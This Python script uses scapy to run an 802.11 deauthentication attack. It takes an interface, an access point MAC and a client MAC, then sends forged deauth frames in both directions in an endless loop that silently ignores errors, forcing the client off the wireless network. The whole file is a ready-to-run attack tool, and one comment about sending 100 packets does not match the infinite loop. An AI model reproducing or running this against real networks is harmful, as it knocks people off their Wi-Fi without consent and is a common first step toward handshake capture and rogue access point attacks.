from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth
import sys 
import signal
from mode_switcher import mode_switcher



def deauthenticate(iface, ap_mac, client_mac):
    # 802.11 layer creation
    dot11_client = Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)
    dot11_ap = Dot11(addr1=ap_mac, addr2=client_mac, addr3=client_mac)

    # stacking the 802.11 created layer with RadioTap above it and Deauth below it
    packet_client = RadioTap()/dot11_client/Dot11Deauth(reason=1)
    packet_ap = RadioTap()/dot11_ap/Dot11Deauth(reason=1)

    # sending the packet 100 times iwth 0.1 seconds interval
    print(f'Sending Deauthentication packets ...')
    sys.stdout.flush()
    while True:
        try:
            sendp(packet_client, inter=0.1, count=10, iface=iface, verbose=0)
            sendp(packet_ap, inter=0.1, count=10, iface=iface, verbose=0)
        except:
            pass

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print('Invalid amount of arguments in deauth_attack.py')
        exit(-1)
    iface, ap_mac, client_mac = sys.argv[1], sys.argv[2], sys.argv[3]
    deauthenticate(iface, ap_mac, client_mac)